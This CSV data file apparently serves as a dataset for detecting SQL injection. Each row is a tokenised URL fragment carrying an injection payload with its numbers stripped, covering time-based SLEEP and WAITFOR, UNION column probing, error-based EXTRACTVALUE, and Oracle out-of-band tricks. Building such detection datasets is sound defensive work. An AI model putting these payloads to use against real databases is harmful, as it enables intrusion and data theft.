,language,source
2080,sql,". . . / / / ? = & =   "" ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) cxFv ) # "
2081,sql,". . . ? = & =   ' RLIKE SLEEP ( ) AND ' ITzu ' = ' "
2082,sql,". . / / / ? = & = & = & =   ' ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UygZ ) AND ( ' iDnI ' = ' "
2083,sql,". . . ? = & = & = & =   ) ) ; SELECT PG_SLEEP ( )  --"
2084,sql,". . . / / / ? = & =   ' UNION ALL SELECT NULL , NULL # "
2085,sql,". . / / / / ? = & =   % ' ) ) AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ( ( ' % ' = ' "
2086,sql,". . / / / ? =   ' ) ) ) UNION ALL SELECT NULL , NULL , NULL -- "
2087,sql,". . . . / / / ? = & =   ' ; SELECT PG_SLEEP ( )  --"
2088,sql,". . / ? = & =   ' AND SLEEP ( ) AND ' xMHL ' LIKE ' "
2089,sql,". . . . / ? = & = & =   "" ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
2090,sql,". . ? = & =   ) UNION ALL SELECT NULL , NULL , NULL -- "
2091,sql,". . . / / / ? = & = & = & =   "" ) ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
2092,sql,". . / ? = & =   ) ) AND = % "
2093,sql,". . / / / / ? =   ) AND = AND ( = "
2094,sql,". . / ? =   ' WAITFOR DELAY ' : : '  -- "
2095,sql,". . . . / / / / ? = & = & = & =  - ) UNION ALL SELECT , , , , ,  -- "
2096,sql,". . / ? =   ) ORDER BY # "
2097,sql,". . / / / ? = & = & =   ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( = "
2098,sql,". . . / / / / ? = & = & =   "" ) ; SELECT SLEEP ( ) # "
2099,sql,". . . . / ? = & =   ' ) ) ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN  ELSE x END ) ) AND ( ( ( ' ZxlB ' = ' "
2100,sql,". . . . ? = & = & =   , ( SELECT  FROM ( SELECT ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) ) s ) "
2101,sql,". . . . / / ? = & = & =   ' ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ' cHXg ' LIKE ' "
2102,sql,". . / / / ? = & = & = & =  - "" UNION ALL SELECT ,  -- "
2103,sql,". . . / / ? = & =   UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2104,sql,". . / ? = & = & = & =   AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL # "
2105,sql,". . . . / / / / ? = & = & =   "" ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ( " RRzo " = " "
2106,sql,". . . . / / / / ? = & = & =   ) ) AND ELT ( = , SLEEP ( ) ) AND ( ( = "
2107,sql,". . . / ? =   UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2108,sql,". . / ? =   AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) # "
2109,sql,". . ? = & =   % ' UNION ALL SELECT NULL # "
2110,sql,". . . . / / / / ? = & = & = & =  - "" ORDER BY # "
2111,sql,". . . . / / ? = & =   "" ) ORDER BY  -- "
2112,sql,". . / / / ? = & = & =   % "" AND = % "
2113,sql,". . . . / / / / ? = & =   ) ) UNION ALL SELECT NULL , NULL , NULL # "
2114,sql,". . . . ? = & = & =   % ' AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ' % ' = ' "
2115,sql,". . . ? =   % ' ) ) AND = % "
2116,sql,". . / / ? = & = & =   % ' ) UNION ALL SELECT NULL , NULL , NULL , NULL # "
2117,sql,". . / / ? = & = & =   ' ) AND = AND ( ' aIso ' = ' "
2118,sql,". . ? =   % ' ) ) AND MAKE_SET ( = , ) AND ( ( ' % ' = ' "
2119,sql,". . / / ? =  - ' UNION ALL SELECT , , ,  -- "
2120,sql,". . / / / / ? = & = & =   ) ) ) UNION ALL SELECT NULL -- "
2121,sql,". . . ? = & =   ' , ( SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END ) )  -- "
2122,sql,". . . . ? = & =   ' ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ' OfJm ' LIKE ' "
2123,sql,". . . . ? = & = & =  - ' ORDER BY  -- "
2124,sql,". . . / / ? = & = & =   ) AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x )  -- "
2125,sql,". . / / / / ? = & = & = & =   ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN xcdfeecaffcdef ELSE x END ) ) AND ( = "
2126,sql,". . / / ? =    UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
2127,sql,". . . . / / ? = & = & =   "" AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND " OXLt " = " "
2128,sql,". . . . / / / / ? =   ) AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) AND ( = "
2129,sql,". . . . / ? = & = & = & =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2130,sql,". . . . / ? = & =  - ' ) UNION ALL SELECT , , , , , , , , # "
2131,sql,". . . . / ? = & = & = & =  - ' UNION ALL SELECT , , , # "
2132,sql,". . . / / / / ? = & =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2133,sql,". . . / / / / ? = & = & =  - "" UNION ALL SELECT ,  -- "
2134,sql,". . . . / / / ? = & = & =  - % "" UNION ALL SELECT , , , , ,  -- "
2135,sql,". . . . / ? = & =   "" ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ( " Zynk " = " "
2136,sql,". . . . / / ? =   ) ) ; IF ( = ) SELECT  ELSE DROP FUNCTION euFA --"
2137,sql,". . / / / ? = & = & = & =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2138,sql,". . / ? =   ' ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2139,sql,". . . . / / / ? = & = & = & =  - UNION ALL SELECT , , , , , , , , , # "
2140,sql,". . . / ? = & = & = & =    UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2141,sql,". . . / ? = & = & =   ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( = "
2142,sql,". . . . / / / ? = & = & =   AND = "
2143,sql,". . / / / ? = & = & = & =   ' ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
2144,sql,". . . ? = & = & = & =  - % "" UNION ALL SELECT , , # "
2145,sql,". . / / / / ? = & =  - ' ORDER BY # "
2146,sql,". . ? = & = & =   UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
2147,sql,". . ? = & = & = & =   "" AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND " EIzt " LIKE " "
2148,sql,". . . / / / / ? = & = & = & =   ' ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ' eSLo ' = ' "
2149,sql,". . / ? = & = & =   ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2150,sql,". . . / / / / ? = & = & =   "" RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) AND " oUkp " = " "
2151,sql,". . . . ? =   ' ) AND =  -- "
2152,sql,". . . / / / ? = & = & = & =   ) AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) )  -- "
2153,sql,". . . / / / ? =   % "" UNION ALL SELECT NULL , NULL , NULL , NULL # "
2154,sql,". . . / / / / ? = & =   % ' ) ) AND = % "
2155,sql,". . / / / ? = & = & = & =   AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) "
2156,sql,". . . / / ? = & =  - % ' ) UNION ALL SELECT , , , , , , , # "
2157,sql,". . / / / / ? =   % ' ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ' % ' = ' "
2158,sql,". . . / / / ? = & =  - ' ) ) ) UNION ALL SELECT , , , , ,  -- "
2159,sql,". . / / / ? = & =  - ) UNION ALL SELECT , , , , ,  -- "
2160,sql,". . / / ? = & =   AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL -- "
2161,sql,". . ? = & = & =  - ) ) ORDER BY # "
2162,sql,". . / / ? = & = & =  - UNION ALL SELECT , , ,  -- "
2163,sql,". . / / / / ? = & = & = & =   % "" AND ELT ( = , SLEEP ( ) ) AND " % " = " "
2164,sql,". . / ? = & = & = & =   ' ) ) AND SLEEP ( ) AND ( ( ' eWzK ' LIKE ' "
2165,sql,". . . . ? = & = & =   ' ; WAITFOR DELAY ' : : '  --"
2166,sql,". . / / / ? =   ' AND = # "
2167,sql,". . / / / ? =   "" AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND " GFMZ " = " "
2168,sql,". . . . / ? = & =  - ) UNION ALL SELECT , , ,  -- "
2169,sql,". . / ? = & =  - ) UNION ALL SELECT , ,  -- "
2170,sql,". . / / ? = & = & = & =   % ' ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ' % ' = ' "
2171,sql,". . . / / / ? = & = & =   "" AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND " pZqB " = " "
2172,sql,". . . . / / ? = & = & = & =   UNION ALL SELECT NULL -- "
2173,sql,". . . ? = & =   % ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ' % ' = ' "
2174,sql,". . . ? = & = & = & =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
2175,sql,". . / / / / ? =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2176,sql,". . . . / / ? = & = & = & =  - ' UNION ALL SELECT , , , , , , , , # "
2177,sql,". . . . / / / / ? = & = & =   "" ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) AND ( " aYzs " = " "
2178,sql,". . . / ? = & = & = & =  - ) UNION ALL SELECT # "
2179,sql,". . . . ? =   ) ) ) AND MAKE_SET ( = , ) AND ( ( ( = "
2180,sql,". . . / ? =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2181,sql,". . . / / / ? = & = & =   % ' ) ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( ' % ' = ' "
2182,sql,". . . . / / / ? = & =   "" AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND " cUHL " = " "
2183,sql,". . / ? = & = & =   % ' ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ( ' % ' = ' "
2184,sql,". . . . ? = & = & =   % ' ) ) AND = AND ( ( ' % ' = ' "
2185,sql,". . . ? = & =   "" AND ELT ( = , SLEEP ( ) ) AND " SvJK " = " "
2186,sql,". . . / / / ? =   ' , ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) )  -- "
2187,sql,". . . / / ? = & =    UNION ALL SELECT NULL -- "
2188,sql,". . . . / / ? = & =   ' ) ORDER BY  -- "
2189,sql,". . . . / ? = & = & =   ' ) ) ; SELECT PG_SLEEP ( )  --"
2190,sql,". . ? =   ) ) AND = % "
2191,sql,". . . . / / / / ? = & = & =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2192,sql,". . . . / ? =   ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ( ' MVyi ' LIKE ' "
2193,sql,". . . . / / ? =   % ' ) ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ( ' % ' = ' "
2194,sql,". . . . ? = & = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL # "
2195,sql,". . ? = & =   AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC )  -- "
2196,sql,". . . . / / ? = & = & = & =   ' AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) )  -- "
2197,sql,". . . . / / / ? =  - UNION ALL SELECT , , , , , , , , , # "
2198,sql,". . . / ? = & = & = & =   "" ) ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) eJit ) # "
2199,sql,". . . . / / / ? =   ' , ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) )  -- "
2200,sql,". . / ? = & = & = & =   RLIKE ( SELECT ( CASE WHEN ( = ) THEN  ELSE x END ) ) # "
2201,sql,". . / ? = & = & = & =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
2202,sql,". . . . / / / ? =   ' ) ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ( ' pLzW ' = ' "
2203,sql,". . / / / ? = & = & = & =   ) ) AND = AND ( ( = "
2204,sql,". . . / / ? =   % ' ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
2205,sql,". . . . / / / ? = & =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2206,sql,". . / / / / ? = & =   "" ) ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ( " peWJ " = " "
2207,sql,". . . / / / ? = & = & = & =   ' ) ) ) AND = % "
2208,sql,". . . . ? = & =   "" UNION ALL SELECT NULL , NULL , NULL , NULL # "
2209,sql,". . . / ? = & = & =  - ' ) ) UNION ALL SELECT , , ,  -- "
2210,sql,". . . . / / / ? = & = & =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2211,sql,". . . / ? =  - ) UNION ALL SELECT , , , , , ,  -- "
2212,sql,". . . ? = & =   ' ) ) AND = % "
2213,sql,". . / / / ? = & =   % ' ) ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ( ' % ' = ' "
2214,sql,". . . . / / ? = & = & =   % ' ) ) ORDER BY # "
2215,sql,". . ? = & =   "" AND =  -- "
2216,sql,". . . / / / / ? =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2217,sql,". . . / ? = & = & =  - ORDER BY # "
2218,sql,". . / ? = & =   AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL # "
2219,sql,". . . / / ? = & =  - "" UNION ALL SELECT , , ,  -- "
2220,sql,". . . / / / / ? = & = & =  - UNION ALL SELECT , , # "
2221,sql,". . . . / ? = & = & =   % ' UNION ALL SELECT NULL , NULL # "
2222,sql,". . . . / / ? =   "" ) AND MAKE_SET ( = , ) AND ( " AEPr " = " "
2223,sql,". . . . / / ? = & = & = & =   % ' ) ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) cxFv ) # "
2224,sql,". . / / ? = & = & =   ) AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x )  -- "
2225,sql,". . . / / / / ? = & =   ' ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2226,sql,". . . / / ? = & = & =   "" ) WAITFOR DELAY ' : : ' AND ( " BQdQ " = " "
2227,sql,". . / ? = & = & =   ' ) ) ) UNION ALL SELECT NULL , NULL # "
2228,sql,". . . / / / / ? = & = & =   . "
2229,sql,". . . / ? = & = & = & =  - ' ) UNION ALL SELECT , , , , , , , # "
2230,sql,". . . . / / / ? = & = & = & =    AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) )  -- "
2231,sql,". . ? =   % ' ) ) ; IF ( = ) SELECT  ELSE DROP FUNCTION rPWm --"
2232,sql,". . . . / / ? = & = & = & =   "" ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2233,sql,". . / ? = & =   ' ) ; WAITFOR DELAY ' : : '  --"
2234,sql,". . . . / / ? = & = & =    PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , )  -- "
2235,sql,". . . . / ? = & =   ' AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ' OpRG ' = ' "
2236,sql,". . / / ? = & =  - ' UNION ALL SELECT  -- "
2237,sql,". . . / / / / ? = & = & =   "" ) ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( " PgiZ " = " "
2238,sql,". . / / / ? =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2239,sql,". . . ? =  - % ' ) ) UNION ALL SELECT , , , # "
2240,sql,". . . / / / ? = & =  - ) UNION ALL SELECT , , , , , ,  -- "
2241,sql,". . . / / ? =   ' UNION ALL SELECT NULL , NULL , NULL , NULL -- "
2242,sql,". . . . / / ? = & = & = & =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2243,sql,". . / / / ? = & =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL -- "
2244,sql,". . . . / / / ? = & = & = & =   % ' ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN  ELSE x END ) ) AND ( ' % ' = ' "
2245,sql,". . / / / / ? = & =   ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN  ELSE x END ) ) AND ( = "
2246,sql,". . . . / ? = & =   ' ) ) UNION ALL SELECT NULL , NULL -- "
2247,sql,". . . . / / / ? = & = & = & =   ' ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
2248,sql,". . . . ? = & =   ' PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , )  -- "
2249,sql,". . / ? = & = & =   ) ) ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN xcdfeecaffcdef ELSE x END ) ) AND ( ( ( = "
2250,sql,". . . . / / / / ? = & =   % ' ) ) AND = AND ( ( ' % ' = ' "
2251,sql,". . ? = & =   "" ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( " buyI " LIKE " "
2252,sql,". . . ? = & = & = & =  - % ' ) ) ORDER BY  -- "
2253,sql,". . / ? =    UNION ALL SELECT NULL -- "
2254,sql,". . . . / / / ? =   % "" AND = % "
2255,sql,". . / / ? = & = & =   "" UNION ALL SELECT NULL , NULL -- "
2256,sql,". . . . / ? = & = & =   ' ) ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) cxFv ) # "
2257,sql,". . . . / ? = & = & = & =   ' ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ' SCnR ' LIKE ' "
2258,sql,". . . / / / ? = & = & =  - UNION ALL SELECT , , , , , , # "
2259,sql,". . . / / / ? =   % ' ) ) ORDER BY  -- "
2260,sql,". . / / ? = & = & = & =   ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
2261,sql,". . . ? = & = & =   ' , ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  UNION ALL SELECT ) END ) )  -- "
2262,sql,". . . . / / ? = & = & = & =   % ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2263,sql,". . . . / / ? = & = & =  - % ' ) ORDER BY  -- "
2264,sql,". . / / / / ? = & = & = & =   ) ) ORDER BY  -- "
2265,sql,". . / / / / ? = & = & =   ' AND =  -- "
2266,sql,". . / ? =   ' ) ) AND = AND ( ( ' EJiq ' LIKE ' "
2267,sql,". . / / / / ? = & = & =  - "" UNION ALL SELECT , , , , ,  -- "
2268,sql,". . . . / / / ? = & = & =   % ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
2269,sql,". . . . / ? =   UNION ALL SELECT NULL , NULL , NULL , NULL # "
2270,sql,". . / / / ? =   ' AND MAKE_SET ( = , ) AND ' CzkR ' LIKE ' "
2271,sql,". . / ? = & =   ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM DUAL UNION SELECT  FROM DUAL ) END ) "
2272,sql,". . . / / / / ? = & = & =   ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , )  -- "
